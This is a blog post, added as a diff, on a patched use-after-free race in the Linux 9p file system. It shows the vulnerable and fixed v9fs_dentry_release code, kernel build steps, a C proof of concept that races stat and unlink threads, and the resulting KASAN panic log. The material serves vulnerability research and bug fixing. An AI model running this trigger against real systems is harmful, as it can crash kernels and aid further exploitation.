@@ -1,0 +1,331 @@
+---
+layout: post
+title: "Race Condition in 9p file system."
+date: 2024-05-29 1:1:1 +0100
+categories: fuzzing
+---
+
+[from commit message](https://lore.kernel.org/linux-kernel/ZlaC1Sn6WZtEGsbK@codewreck.org/T/) there is a use-after-free on dentry's d_fsdata fid list when a thread
+looks up a fid through dentry while another thread unlinks it:
+
+UAF thread:
+{% highlight shell %}
+refcount_t: addition on 0; use-after-free.
+ p9_fid_get linux/./include/net/9p/client.h:262
+ v9fs_fid_find+0x236/0x280 linux/fs/9p/fid.c:129
+ v9fs_fid_lookup_with_uid linux/fs/9p/fid.c:181
+ v9fs_fid_lookup+0xbf/0xc20 linux/fs/9p/fid.c:314
+ v9fs_vfs_getattr_dotl+0xf9/0x360 linux/fs/9p/vfs_inode_dotl.c:400
+ vfs_statx+0xdd/0x4d0 linux/fs/stat.c:248
+{% endhighlight %}
+
+Freed by:
+{% highlight shell %}
+ p9_fid_destroy (inlined)
+ p9_client_clunk+0xb0/0xe0 linux/net/9p/client.c:1456
+ p9_fid_put linux/./include/net/9p/client.h:278
+ v9fs_dentry_release+0xb5/0x140 linux/fs/9p/vfs_dentry.c:55
+ v9fs_remove+0x38f/0x620 linux/fs/9p/vfs_inode.c:518
+ vfs_unlink+0x29a/0x810 linux/fs/namei.c:4335
+{% endhighlight %}
+
+The problem is that d_fsdata was not accessed under d_lock, because
+d_release() normally is only called once the dentry is otherwise no
+longer accessible but since we also call it explicitly in v9fs_remove
+that lock is required:
+move the hlist out of the dentry under lock then unref its fids once
+they are no longer accessible.
+
+[/fs/9p/vfs_dentry.c](https://github.com/torvalds/linux/blob/e0cce98fe279b64f4a7d81b7f5c3a23d80b92fbc/fs/9p/vfs_dentry.c#L48)
+{% highlight cpp %}
+static void v9fs_dentry_release(struct dentry *dentry)
+{
+	struct hlist_node *p, *n;
+
+	p9_debug(P9_DEBUG_VFS, " dentry: %pd (%p)\n",
+		 dentry, dentry);
+	hlist_for_each_safe(p, n, (struct hlist_head *)&dentry->d_fsdata)
+		p9_fid_put(hlist_entry(p, struct p9_fid, dlist));
+	dentry->d_fsdata = NULL;
+}
+{% endhighlight %}
+
+fix:
+[/fs/9p/vfs_dentry.c](https://github.com/martinetd/linux/commit/c898afdc15645efb555acb6d85b484eb40a45409)
+{% highlight cpp %}
+
+static void v9fs_dentry_release(struct dentry *dentry)
+{
+	struct hlist_node *p, *n;
+	struct hlist_head head;
+
+	p9_debug(P9_DEBUG_VFS, " dentry: %pd (%p)\n",
+		 dentry, dentry);
+
+	spin_lock(&dentry->d_lock);
+	hlist_move_list((struct hlist_head *)&dentry->d_fsdata, &head);
+	spin_unlock(&dentry->d_lock);
+
+	hlist_for_each_safe(p, n, &head)
+		p9_fid_put(hlist_entry(p, struct p9_fid, dlist));
+}
+{% endhighlight %}
+
+
+to run the poc first build the kernel and run it via virtio
+
+{% highlight shell %}
+git clone --depth 1 https://github.com/torvalds/linux.git
+git clone --depth 1 https://github.com/amluto/virtme.git
+cd linux
+../virtme/virtme-configkernel  --defconfig
+/scripts/config -e KASAN -e KASAN_INLINE -e WARNING
+make 
+{% endhighlight %}
+
+then inside the shell run the following code.
+
+{% highlight cpp %}
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+
+typedef struct
+{
+    int dirfd;
+    const char *filePath;
+} ThreadArgs;
+
+void *statThread(void *arg)
+{
+    ThreadArgs *args = (ThreadArgs *)arg;
+    struct stat buf;
+    int retval;
+    FILE *outFile;
+
+    while (1) {
+        if (access(args->filePath, F_OK) != -1) {
+            retval = fstatat(args->dirfd, args->filePath, &buf, 0);
+        }
+        else {
+            outFile = fopen(args->filePath, "w");
+            if (outFile) {
+                fclose(outFile);
+            }
+        }
+    }
+    return NULL;
+}
+void *unlinkThread(void *arg)
+{
+    ThreadArgs *args = (ThreadArgs *)arg;
+    while (1) {
+        printf("!!!!\n");
+        unlink(args->filePath);
+    }
+    return NULL;
+}
+
+int main()
+{
+    pthread_t threads[2];
+    int dirfd;
+    const char *dirPath = ".";
+    const char *filePath = "example.txt";
+    ThreadArgs args;
+
+    // Open the directory file descriptor
+    dirfd = open(dirPath, O_RDONLY);
+    if (dirfd < 0) {
+        perror("Failed to open directory");
+        return 1;
+    }
+
+    args.dirfd = dirfd;
+    args.filePath = filePath;
+
+    // Create the stat and unlink threads
+    if (pthread_create(&threads[0], NULL, statThread, &args) != 0) {
+        perror("Failed to create stat thread");
+        close(dirfd);
+        return 1;
+    }
+    if (pthread_create(&threads[1], NULL, unlinkThread, &args) != 0) {
+        perror("Failed to create unlink thread");
+        close(dirfd);
+        return 1;
+    }
+
+    // Wait for both threads to finish (which they never will in this setup)
+    pthread_join(threads[0], NULL);
+    pthread_join(threads[1], NULL);
+
+    close(dirfd);
+    return 0;
+}
+{% endhighlight %}
+
+
+panic log:
+
+{% highlight shell %}
+[   17.000245] BUG: KASAN: slab-use-after-free in p9_client_getattr_dotl+0x170/0x190
+[   17.000938] Read of size 8 at addr ffff88810590ad00 by task 9poc/151
+
+[   17.001713] CPU: 2 PID: 151 Comm: 9poc Tainted: G        W          6.8.0 #83
+[   17.002433] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+[   17.003866] Call Trace:
+[   17.004259]  <TASK>
+[   17.004720]  dump_stack_lvl+0x4b/0x80
+[   17.005263]  print_report+0x106/0x650
+[   17.005722]  ? p9_client_getattr_dotl+0x170/0x190
+[   17.006201]  kasan_report+0xbe/0xf0
+[   17.006568]  ? p9_client_getattr_dotl+0x170/0x190
+[   17.007059]  p9_client_getattr_dotl+0x170/0x190
+[   17.007579]  v9fs_vfs_getattr_dotl+0x115/0x370
+[   17.008033]  vfs_statx+0x100/0x460
+[   17.008450]  ? __pfx_vfs_statx+0x10/0x10
+[   17.008854]  ? srso_return_thunk+0x5/0x5f
+[   17.009315]  ? getname_flags.part.0+0xb4/0x450
+[   17.009719]  vfs_fstatat+0x8e/0xc0
+[   17.010094]  __do_sys_newfstatat+0x6b/0xc0
+[   17.010547]  ? __pfx___do_sys_newfstatat+0x10/0x10
+[   17.010989]  ? srso_return_thunk+0x5/0x5f
+[   17.011340]  ? lockdep_hardirqs_on_prepare+0x277/0x410
+[   17.011861]  do_syscall_64+0xcc/0x1e0
+[   17.012303]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+[   17.012743] RIP: 0033:0x7f3d8fd50d3e
+[   17.013134] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 <3d> 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
+[   17.014874] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
+[   17.015543] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
+[   17.016198] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
+[   17.016831] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
+[   17.017506] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
+[   17.018138] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
+[   17.018788]  </TASK>
+
+[   17.019363] Allocated by task 151:
+[   17.019686]  kasan_save_stack+0x24/0x50
+[   17.020093]  kasan_save_track+0x14/0x30
+[   17.020553]  __kasan_kmalloc+0x7f/0x90
+[   17.020891]  p9_fid_create+0x3e/0x3a0
+[   17.021300]  p9_client_walk+0xa4/0x440
+[   17.021740]  v9fs_vfs_atomic_open_dotl+0x357/0x8b0
+[   17.022165]  lookup_open.isra.0+0x991/0x1550
+[   17.022568]  path_openat+0x86b/0x22f0
+[   17.022993]  do_filp_open+0x1b0/0x3e0
+[   17.023383]  do_sys_openat2+0x11d/0x160
+[   17.023725]  __x64_sys_openat+0x11e/0x1e0
+[   17.024095]  do_syscall_64+0xcc/0x1e0
+[   17.024445]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+[   17.025218] Freed by task 152:
+[   17.025506]  kasan_save_stack+0x24/0x50
+[   17.025909]  kasan_save_track+0x14/0x30
+[   17.026370]  kasan_save_free_info+0x3b/0x60
+[   17.026762]  __kasan_slab_free+0x106/0x190
+[   17.027176]  kfree+0xe1/0x300
+[   17.027555]  p9_client_clunk+0x93/0xe0
+[   17.027948]  v9fs_dentry_release+0xb4/0x140
+[   17.028437]  v9fs_remove+0x31a/0x4c0
+[   17.028774]  vfs_unlink+0x29e/0x810
+[   17.029149]  do_unlinkat+0x425/0x5c0
+[   17.029579]  __x64_sys_unlink+0xa4/0xe0
+[   17.029930]  do_syscall_64+0xcc/0x1e0
+[   17.030334]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+
+[   17.031059] The buggy address belongs to the object at ffff88810590ad00
+                which belongs to the cache kmalloc-96 of size 96
+[   17.032134] The buggy address is located 0 bytes inside of
+                freed 96-byte region [ffff88810590ad00, ffff88810590ad60)
+
+[   17.033506] The buggy address belongs to the physical page:
+[   17.033998] page:00000000d4ba65e2 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10590a
+[   17.034817] flags: 0x200000000000800(slab|node=0|zone=2)
+[   17.035307] page_type: 0xffffffff()
+[   17.035623] raw: 0200000000000800 ffff888100042780 dead000000000122 0000000000000000
+[   17.036358] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
+[   17.037164] page dumped because: kasan: bad access detected
+
+[   17.037830] Memory state around the buggy address:
+[   17.038281]  ffff88810590ac00: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[   17.038925]  ffff88810590ac80: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[   17.039756] >ffff88810590ad00: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
+[   17.040437]                    ^
+[   17.040735]  ffff88810590ad80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   17.041420]  ffff88810590ae00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   17.042213] ==================================================================
+[   17.042872] Disabling lock debugging due to kernel taint
+[   17.043615] general protection fault, probably for non-canonical address 0xe0000be7b1d87003: 0000 [#1] PREEMPT SMP KASAN NOPTI
+[   17.044955] KASAN: probably user-memory-access in range [0x00007f3d8ec38018-0x00007f3d8ec3801f]
+[   17.045905] CPU: 2 PID: 151 Comm: 9poc Tainted: G    B   W          6.8.0 #83
+[   17.046762] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+[   17.047749] RIP: 0010:p9_client_rpc+0xe2/0x940
+[   17.048310] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 1c 48 89 fa 48 c1 ea 03 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
+[   17.049932] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
+[   17.050497] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
+[   17.051172] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
+[   17.052007] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
+[   17.052845] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
+[   17.053656] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
+[   17.054464] FS:  00007f3d8fc39640(0000) GS:ffff8881f6f00000(0000) knlGS:0000000000000000
+[   17.055413] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   17.056081] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0
+[   17.056930] Call Trace:
+[   17.057238]  <TASK>
+[   17.057532]  ? die_addr+0x3c/0xa0
+[   17.057981]  ? exc_general_protection+0x149/0x220
+[   17.058556]  ? asm_exc_general_protection+0x26/0x30
+[   17.059206]  ? p9_client_rpc+0x89e/0x940
+[   17.059654]  ? p9_client_rpc+0xe2/0x940
+[   17.060134]  ? p9_client_rpc+0x89e/0x940
+[   17.060637]  ? __pfx_p9_client_rpc+0x10/0x10
+[   17.061158]  ? add_taint+0x55/0x90
+[   17.061540]  ? srso_return_thunk+0x5/0x5f
+[   17.062038]  ? add_taint+0x25/0x90
+[   17.062455]  ? srso_return_thunk+0x5/0x5f
+[   17.062948]  ? end_report+0x7e/0x130
+[   17.063376]  ? srso_return_thunk+0x5/0x5f
+[   17.063884]  ? p9_client_getattr_dotl+0x170/0x190
+[   17.064450]  p9_client_getattr_dotl+0xb0/0x190
+[   17.065000]  v9fs_vfs_getattr_dotl+0x115/0x370
+[   17.065523]  vfs_statx+0x100/0x460
+[   17.065911]  ? __pfx_vfs_statx+0x10/0x10
+[   17.066374]  ? srso_return_thunk+0x5/0x5f
+[   17.066879]  ? getname_flags.part.0+0xb4/0x450
+[   17.067424]  vfs_fstatat+0x8e/0xc0
+[   17.067897]  __do_sys_newfstatat+0x6b/0xc0
+[   17.068371]  ? __pfx___do_sys_newfstatat+0x10/0x10
+[   17.068961]  ? srso_return_thunk+0x5/0x5f
+[   17.069398]  ? lockdep_hardirqs_on_prepare+0x277/0x410
+[   17.069878]  do_syscall_64+0xcc/0x1e0
+[   17.070329]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
+[   17.070903] RIP: 0033:0x7f3d8fd50d3e
+[   17.071370] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 <3d> 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
+[   17.073026] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
+[   17.073783] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
+[   17.074440] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
+[   17.075263] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
+[   17.076061] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
+[   17.076893] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
+[   17.077665]  </TASK>
+[   17.077960] Modules linked in:
+[   17.078409] ---[ end trace 0000000000000000 ]---
+[   17.078857] RIP: 0010:p9_client_rpc+0xe2/0x940
+[   17.079272] Code: e8 03 80 3c 10 00 0f 85 d0 07 00 00 48 8b 44 24 30 4c 8b 68 48 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 1c 48 89 fa 48 c1 ea 03 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 92 07 00 00
+[   17.081015] RSP: 0018:ffff88810634fb08 EFLAGS: 00010216
+[   17.081545] RAX: dffffc0000000000 RBX: 0000000000000018 RCX: ffffffff8413d4de
+[   17.082185] RDX: 00000fe7b1d87003 RSI: 0000000000000008 RDI: 00007f3d8ec3801b
+[   17.082876] RBP: ffff88810634fc78 R08: 0000000000003fff R09: fffffbfff0e04828
+[   17.083638] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
+[   17.084325] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
+[   17.085059] FS:  00007f3d8fc39640(0000) GS:ffff8881f6f00000(0000) knlGS:0000000000000000
+[   17.085838] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   17.086447] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0
+
+{% endhighlight %}
